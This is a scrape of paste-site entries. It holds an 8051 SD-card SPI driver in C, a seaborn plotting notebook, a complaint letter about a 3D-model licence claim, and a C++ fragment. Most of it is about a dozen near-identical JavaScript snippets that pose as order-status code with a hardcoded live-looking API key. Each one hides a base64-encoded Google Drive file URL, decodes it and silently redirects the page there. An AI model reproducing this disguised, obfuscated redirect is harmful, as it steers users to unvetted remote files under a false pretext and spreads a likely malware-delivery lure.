   SPIWrite8((uint8_t)(arg >> 16));
   SPIWrite8((uint8_t)(arg >> 8));
   SPIWrite8((uint8_t)(arg));

   // https://github.com/arduino-libraries/SD/blob/master/src/utility/Sd2Card.cpp#L132
   if (cmd == CMD0) {
      crc = 0X95;  // correct crc for CMD0 with arg 0
   }
   if (cmd == CMD8) {
      crc = 0X87;  // correct crc for CMD8 w
   }

   // transmit crc
   SPIWrite8(crc);


   /* Receive a command response */
	n = 10;								/* Wait for a valid response in timeout of 10 attempts */
	do {
		res = SPI_Transfer(0xFF);
	} while ((res & 0x80) && --n);

	return res;			/* Return with the response value */
}

// for init
uint8_t SD_SendCommandSlow(uint8_t cmd, uint32_t arg)
{
   uint8_t crc = 0xFF;
   uint8_t n, res;

   // transmit command to sd card
   SPIWrite8(cmd|0x40);

   // transmit argument
   SPIWrite8((uint8_t)(arg >> 24));
   SPIWrite8((uint8_t)(arg >> 16));
   SPIWrite8((uint8_t)(arg >> 8));
   SPIWrite8((uint8_t)(arg));

   // https://github.com/arduino-libraries/SD/blob/master/src/utility/Sd2Card.cpp#L132
   if (cmd == CMD0) {
      crc = 0X95;  // correct crc for CMD0 with arg 0
   }
   if (cmd == CMD8) {
      crc = 0X87;  // correct crc for CMD8 w
   }

   // transmit crc
   SPIWrite8(crc);


   /* Receive a command response */
	n = 10;								/* Wait for a valid response in timeout of 10 attempts */
	do {
		res = SPI_TransferSlow(0xFF);
	} while ((res & 0x80) && --n);

	return res;			/* Return with the response value */
}


/*--------------------------------------------------------------------------

   Public Functions

---------------------------------------------------------------------------*/


/*-----------------------------------------------------------------------*/
/* Initialize Disk Drive                                                 */
/*-----------------------------------------------------------------------*/

DSTATUS disk_initialize (void)
{
	xdata uint8_t n, cmd, ty, buf[4];
	xdata uint16_t tmr;
   xdata uint8_t i;
   xdata uint8_t oldSpiFrequency;

   // hardware and pinout specific
   //P0MDOUT   = 0x29;
   //P0SKIP    = 0x07;
   //XBR0      = 0x02;


   // try keeping CKPOL at 0 for SD
   SPI0CFG = 0x40;//| 0x10; // MSTEN | CKPOL
   SPI0CN = 0x01; // SPIEN

   oldSpiFrequency = SPI0CKR;

   SPI0CKR = SPI0CKR_SPEED_INIT;
   SPI0CFG &= ~(0x20 | 0x10); // have both CKPOL and CKPHA to 0


	// assert chip select
   SPIWrite8(0xFF);
   SD_CS = SPI_CS_ENABLE;
   SPIWrite8(0xFF);

	/* Dummy clocks */
   for(i = 0; i < 10; i++) SPIWrite8(0xFF);


   

	ty = 0;
	if (SD_SendCommandSlow(CMD0, 0) == 1) {			/* Enter Idle state */
		if (SD_SendCommandSlow(CMD8, 0x1AA) == 1) {	/* SDv2 */
			for (n = 0; n < 4; n++) buf[n] = SPI_TransferSlow(0xFF);	/* Get trailing return value of R7 resp */
			if (buf[2] == 0x01 && buf[3] == 0xAA) {			/* The card can work at vdd range of 2.7-3.6V */
				for (tmr = 1000; tmr; tmr--) {				/* Wait for leaving idle state (ACMD41 with HCS bit) */
					if (SD_SendCommandSlow(ACMD41, 1UL << 30) == 0) break;
					MicrosecondsWait1000();
				}
				if (tmr && SD_SendCommandSlow(CMD58, 0) == 0) {		/* Check CCS bit in the OCR */
					for (n = 0; n < 4; n++) buf[n] = SPI_TransferSlow(0xFF);
					ty = (buf[0] & 0x40) ? CT_SD2 | CT_BLOCK : CT_SD2;	/* SDv2 (HC or SC) */
				}
			}
		} else {							/* SDv1 or MMCv3 */
			if (SD_SendCommandSlow(ACMD41, 0) <= 1) 	{
				ty = CT_SD1; cmd = ACMD41;	/* SDv1 */
			} else {
				ty = CT_MMC; cmd = CMD1;	/* MMCv3 */
			}
			for (tmr = 1000; tmr; tmr--) {			/* Wait for leaving idle state */
				if (SD_SendCommandSlow(cmd, 0) == 0) break;
				MicrosecondsWait1000();
			}
			if (!tmr || SD_SendCommandSlow(CMD16, 512) != 0)			/* Set R/W block length to 512 */
				ty = 0;
		}
	}
	CardType = ty;

	// deassert chip select
   SPIWrite8(0xFF);
   SD_CS = SPI_CS_DISABLE;
   SPIWrite8(0xFF);

   SPI0CKR = oldSpiFrequency;

	return ty ? 0 : STA_NOINIT;
}



/*-----------------------------------------------------------------------*/
/* Read partial sector                                                   */
/*-----------------------------------------------------------------------*/

DRESULT disk_readp (
	uint8_t *buff,		/* Pointer to the read buffer (NULL:Read bytes are forwarded to the stream) */
	uint32_t sector,	/* Sector number (LBA) */
	uint16_t offset,	/* Byte offset to read from (0..511) */
	uint16_t count		/* Number of bytes to read (ofs + cnt mus be <= 512) */
) compact
{
	idata DRESULT res;
	data uint8_t d;
	idata uint16_t bc, tmr;
   idata uint8_t oldSpiFrequency;


   oldSpiFrequency = SPI0CKR;

   SPI0CKR = SPI0CKR_SPEED_NORMAL;

   // assert chip select
   SPIWrite8(0xFF);
   SD_CS = SPI_CS_ENABLE;
   SPIWrite8(0xFF);



	if (!(CardType & CT_BLOCK)) sector *= 512;	/* Convert to byte address if needed */

	res = RES_ERROR;
	if (SD_SendCommand(CMD17, sector) == 0) {		/* READ_SINGLE_BLOCK */

		tmr = 1000;
		do {							/* Wait for data packet in timeout of 100ms */
			MicrosecondsWait100();
			d = SPI_Transfer(0xFF);
		} while (d == 0xFF && --tmr);

		if (d == 0xFE) {				/* A data packet arrived */
			bc = 514 - offset - count;

			/* Skip leading bytes */
			while(offset--) SPIWrite8(0xFF);

			/* Receive a part of the sector */
			if (buff) {	/* Store data to the memory */
				do
					*buff++ = SPI_Transfer(0xFF);
				while (--count);
			} else {	/* Forward data to the outgoing stream */
				do {
					d = SPI_Transfer(0xFF);
					FORWARD(d);
				} while (--count);
			}

			/* Skip trailing bytes and CRC */
			while(bc--) SPIWrite8(0xFF);

			res = RES_OK;
		}
	}

	// deassert chip select
   SPIWrite8(0xFF);
   SD_CS = SPI_CS_DISABLE;
   SPIWrite8(0xFF);

   SPI0CKR = oldSpiFrequency;

	return res;
}



/*-----------------------------------------------------------------------*/
/* Write partial sector                                                  */
/*-----------------------------------------------------------------------*/
#if _USE_WRITE

DRESULT disk_writep (
	const uint8_t *buff,	/* Pointer to the bytes to be written (NULL:Initiate/Finalize sector write) */
	uint32_t sc			/* Number of bytes to send, Sector number (LBA) or zero */
)
{
	idata DRESULT res;
	idata uint16_t bc, tmr;
	static data uint16_t wc;
   idata uint8_t oldSpiFrequency;

   oldSpiFrequency = SPI0CKR;

   SPI0CKR = SPI0CKR_SPEED_NORMAL;

   // assert chip select
   SPIWrite8(0xFF);
   SD_CS = SPI_CS_ENABLE;
   SPIWrite8(0xFF);


	res = RES_ERROR;

	if (buff) {		/* Send data bytes */
		bc = (UINT)sc;
		while (bc && wc) {		/* Send data bytes to the card */
			SPIWrite8(*buff++);
			wc--; bc--;
		}
		res = RES_OK;
	} else {
		if (sc) {	/* Initiate sector write transaction */
			if (!(CardType & CT_BLOCK)) sc *= 512;	/* Convert to byte address if needed */
			if (SD_SendCommand(CMD24, sc) == 0) {			/* WRITE_SINGLE_BLOCK */
				SPIWrite8(0xFF); SPIWrite8(0xFE);		/* Data block header */
				wc = 512;							/* Set byte counter */
				res = RES_OK;
			}
		} else {	/* Finalize sector write transaction */
			bc = wc + 2;
			while (bc--) SPIWrite8(0);	/* Fill left bytes and CRC with zeros */
			if ((SPI_Transfer(0xFF) & 0x1F) == 0x05) {	/* Receive data resp and wait for end of write process in timeout of 300ms */
				for (tmr = 10000; SPI_Transfer(0xFF) != 0xFF && tmr; tmr--)	/* Wait for ready (max 1000ms) */
					MicrosecondsWait100();
				if (tmr) res = RES_OK;
			}
				// deassert chip select
            SPIWrite8(0xFF);
            SD_CS = SPI_CS_DISABLE;
            SPIWrite8(0xFF);

            SPI0CKR = oldSpiFrequency;
		}
	}

	return res;
}
#endif

// SD.h
#ifndef __SD_H__
#define __SD_H__

#include <REG51F380.H>

#include ""types.h""


// 100-400KHz during init
#define SPI0CKR_SPEED_INIT (14*2*4)
// max speed 20MHz+ is OK
#define SPI0CKR_SPEED_NORMAL (0+3-1)


#define CMD0_ARG    0x00000000
#define CMD8_ARG    0x0000001AA

#define ACMD41_ARG  0x40000000

#define CMD0 0X00
/** SEND_IF_COND - verify SD Memory Card interface operating condition.*/
#define CMD8 0X08
/** SEND_CSD - read the Card Specific Data (CSD register) */
#define CMD9 0X09
/** SEND_CID - read the card identification information (CID register) */
#define CMD10 0X0A
/** SEND_STATUS - read the card status register */
#define CMD13 0X0D
/** READ_BLOCK - read a single data block from the card */
#define CMD17 0X11
/** WRITE_BLOCK - write a single data block to the card */
#define CMD24 0X18
/** WRITE_MULTIPLE_BLOCK - write blocks of data until a STOP_TRANSMISSION */
#define CMD25 0X19
/** ERASE_WR_BLK_START - sets the address of the first block to be erased */
#define CMD32 0X20
/** ERASE_WR_BLK_END - sets the address of the last block of the continuous
    range to be erased*/
#define CMD33 0X21
/** ERASE - erase all previously selected blocks */
#define CMD38 0X26
/** APP_CMD - escape for application specific command */
#define CMD55 0X37
/** READ_OCR - read the OCR register of a card */
#define CMD58 0X3A
/** SET_WR_BLK_ERASE_COUNT - Set the number of write blocks to be
     pre-erased before writing */
#define ACMD23 0X17

/** SD_SEND_OP_COMD - Sends host capacity support information and
    activates the card's initialization process */
#define ACMD41 0X29

#define PARAM_ERROR(X)      X & 0b01000000
#define ADDR_ERROR(X)       X & 0b00100000
#define ERASE_SEQ_ERROR(X)  X & 0b00010000
#define CRC_ERROR(X)        X & 0b00001000
#define ILLEGAL_CMD(X)      X & 0b00000100
#define ERASE_RESET(X)      X & 0b00000010
#define IN_IDLE(X)          X & 0b00000001

/*struct SD_Error_Struct {
   unsigned IN_WHILE:1;
   unsigned ERASE_RESET:1;
   unsigned ILLEGAL_CMD:1;
   unsigned CRC_ERROR:1;
   unsigned ERASE_SEQ_ERROR:1;
   unsigned ADDR_ERROR:1;
   unsigned PARAM_ERROR:1;
   unsigned padding:1;
} SD_Error_t;*/




#define CMD_VER(X)          ((X >> 4) & 0xF0)
#define VOL_ACC(X)          (X & 0x1F)

#define VOLTAGE_ACC_27_33   0b00000001
#define VOLTAGE_ACC_LOW     0b00000010
#define VOLTAGE_ACC_RES1    0b00000100
#define VOLTAGE_ACC_RES2    0b00001000


#define SD_IN_IDLE_STATE    0x01
#define SD_READY            0x00
#define SD_R1_NO_ERROR(X)   X < 0x02

#define R3_BYTES            4
#define R7_BYTES            4

#define CMD0_MAX_ATTEMPTS       255
#define CMD55_MAX_ATTEMPTS      255
#define SD_ERROR                1
#define SD_SUCCESS              0
#define SD_MAX_READ_ATTEMPTS    1563
#define SD_MAX_WRITE_ATTEMPTS   3907
#define SD_READ_START_TOKEN     0xFE
#define SD_INIT_CYCLES          80

#define SD_START_TOKEN          0xFE
#define SD_ERROR_TOKEN          0x00

#define SD_DATA_ACCEPTED        0x05
#define SD_DATA_REJECTED_CRC    0x0B
#define SD_DATA_REJECTED_WRITE  0x0D

#define SD_BLOCK_LEN            512

/*--------------------------------------------------------------------------

   Module Private Functions

---------------------------------------------------------------------------*/


/* Definitions for MMC/SDC command */
//#define CMD0	(0x40+0)	/* GO_IDLE_STATE */
#define CMD1	(0x40+1)	/* SEND_OP_COND (MMC) */
//#define	ACMD41	(0xC0+41)	/* SEND_OP_COND (SDC) */
//#define CMD8	(0x40+8)	/* SEND_IF_COND */
#define CMD16	(0x40+16)	/* SET_BLOCKLEN */
//#define CMD17	(0x40+17)	/* READ_SINGLE_BLOCK */
//#define CMD24	(0x40+24)	/* WRITE_BLOCK */
//#define CMD55	(0x40+55)	/* APP_CMD */
//#define CMD58	(0x40+58)	/* READ_OCR */

/* Card type flags (CardType) */
#define CT_MMC				0x01	/* MMC ver 3 */
#define CT_SD1				0x02	/* SD ver 1 */
#define CT_SD2				0x04	/* SD ver 2 */
#define CT_SDC				(CT_SD1|CT_SD2)	/* SD */
#define CT_BLOCK			0x08	/* Block addressing */



//void SD_Powerup();

uint8_t SPI_Transfer(uint8_t SPI_data);
uint8_t SPI_TransferSlow(uint8_t SPI_data);

uint8_t SD_SendCommand(uint8_t cmd, uint32_t arg);
uint8_t SD_SendCommandSlow(uint8_t cmd, uint32_t arg);

/*
// R1 seams to be a header for other commands
uint8_t SD_readResponseR1();

uint8_t SD_GoIdle();

void SD_readResponseR7R3(uint8_t *res);

uint8_t SD_Init();

void SD_SendInterfaceCondition(uint8_t *res);

void SD_ReadOCR(uint8_t *res);

uint8_t SD_sendAppSpecificCMDStatus();

uint8_t SD_sendOperationConditions();

uint8_t SD_ReadSingleBlock(uint32_t addr, uint8_t *buf, uint8_t *token);

//uint8_t SD_WriteSingleBlock(uint32_t addr, uint8_t *buf, uint8_t *token);
*/




#endif"
7RaXdT5W,Order.js,Epiphemeral,JavaScript,Monday 7th of April 2025 04:39:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hYYXMibH,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 04:24:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31635/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7ZrYEqsy,Lab_ML(07/04/25),brandblox,Python,Monday 7th of April 2025 04:15:05 AM CDT,"# %%
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np

# %%
yield_apples =[0.895, 0.91, 0.919, 0.926, 0.929, 0.931]
plt.plot(yield_apples)

# %%
years = [2010, 2011, 2012, 2013, 2014, 2015]
yield_apples =[0.895, 0.91, 0.919, 0.926, 0.929, 0.931]

# %%
plt.plot(years,yield_apples)
plt.xlabel('years')
plt.ylabel('Yield (Tons per hectere)')

# %%
years = range(2000, 2012)
apples = [0.895, 0.91, 0.919, 0.929, 0.931, 0.934, 0.936, 0.937, 0.9375, 0.9372, 0.939, 0.940]
oranges = [0.962, 0.941, 0.930, 0.923, 0.918, 0.908, 0.907, 0.904, 0.901, 0.898, 0.9, 0.896]


# %%
sns.set_style(""whitegrid"")
plt.plot(years, apples, label='Apples', marker = 'o')
plt.plot(years, oranges, label='Oranges', marker = 'x')
plt.xlabel('Year')
plt.ylabel('Yield')
plt.title('Yield of Apples and Oranges (2000-2011)')
plt.legend()

plt.show()

# %%
sns.set_style(""whitegrid"")
plt.figure(figsize=(12,6))
plt.plot(years,oranges,marker = 'o')
plt.title(""Yeild of Ornages"")

# %%
years = range(2000,2006)
apples = [0.35,0.6,0.9,0.8,0.65,0.8]
oranges = [0.4,0.8,0.9,0.7,0.6,0.8]

# %%
sns.set_style(""whitegrid"")
plt.bar(years,oranges)
plt.xlabel('Year')
plt.ylabel('Yield')
plt.title(""Crop Yield"")

# %%
sns.set_style(""whitegrid"")
plt.bar(years,oranges)
plt.bar(years,apples, bottom=oranges)
plt.xlabel('Year')
plt.ylabel('Yield')
plt.title(""Crop Yield"")

# %%
tips_df = sns.load_dataset(""tips"")
tips_df

# %%
sns.barplot(x='day',y='total_bill', data=tips_df)

# %%
sns.barplot(x='day',y='total_bill',hue='sex', data=tips_df)

# %%
sns.barplot(x='total_bill',y='day',hue='sex', data=tips_df)

# %%
flower_df = sns.load_dataset(""iris"")
flower_df.sepal_width

# %%
plt.title('Distribution of Sepal width')
plt.hist(flower_df.sepal_width)

# %%
plt.hist(flower_df.sepal_width, bins=5)

# %%
setosa_df = flower_df[flower_df.species == 'setosa']
versicolor_df = flower_df[flower_df.species == 'versicolor']
virginica_df = flower_df[flower_df.species == 'virginica']


# %%
plt.hist(setosa_df.sepal_width, alpha=0.4, bins=np.arange(2, 5, 0.25), label='Setosa')
plt.hist(versicolor_df.sepal_width, alpha=0.4, bins=np.arange(2, 5, 0.25), label='Versicolor')

# %%
plt.title('Distribution of Sepal width')
plt.hist([setosa_df.sepal_width, versicolor_df.sepal_width, virginica_df.sepal_width],
         bins=np.arange(2,5,0.25),
         stacked=True)
plt.legend(['Setosa','Versicolor','Virginica'])


"
aQBuZhmf,Untitled,Epiphemeral,JavaScript,Monday 7th of April 2025 04:08:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67516/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fzdakUVg,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 03:53:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96178/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ytRjzhh5,Order.js,Epiphemeral,JavaScript,Monday 7th of April 2025 03:37:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13975/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kp5kJFxb,2025-04-0 7- complaint to PAS,pigsonthewing,HTML,Monday 7th of April 2025 03:32:46 AM CDT,"On the page at:

   https://finds.org.uk/database/artefacts/record/id/1144151

you have the text ""Please note that a license from the private owner of that object is required before creating and distributing a 3D model of the dodecahedron.""

There is no basis in law for such a claim. The 1700-year old object is clearly not the subject of copyright, nor a patent. Such claims are detrimental to academic study, and on the pursuit of leisure by interested members of the public, and constitute an attempt to place a restrain on trade of those who make such replicas for a living.

Please remove the assertion and consider this a formal complaint if you do not do so,
"
i8CjNA53,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 03:22:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31816/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gLxF3HCG,Untitled,Epiphemeral,JavaScript,Monday 7th of April 2025 03:06:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54311/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0AuKNXnc,Market.js,jm33,JavaScript,Monday 7th of April 2025 03:04:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17090/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zWP90RTP,Untitled,jm33,JavaScript,Monday 7th of April 2025 02:49:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36905/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HWrLiZkN,Products.js,jm33,JavaScript,Monday 7th of April 2025 02:33:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71697/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qUKzG5b2,Order.js,jm33,JavaScript,Monday 7th of April 2025 02:18:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80392/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WMDrLd6H,Присвоение на отрезке и сумма на отрезке,yeskendir_sultanov,C++,Monday 7th of April 2025 02:13:51 AM CDT,"#include <bits/stdc++.h>
#define ll long long

using namespace std;

ll n, k, q;
vector<ll> a, b, add;

void push(int id) {
    if (add[id] != -1) {
        b[id] = 0;
        for (int i = id * k; i < min((id + 1) * k, n); ++i) {
            a[i] = add[id];
            b[id] += a[i];
        }
        add[id] = -1;
    }
}

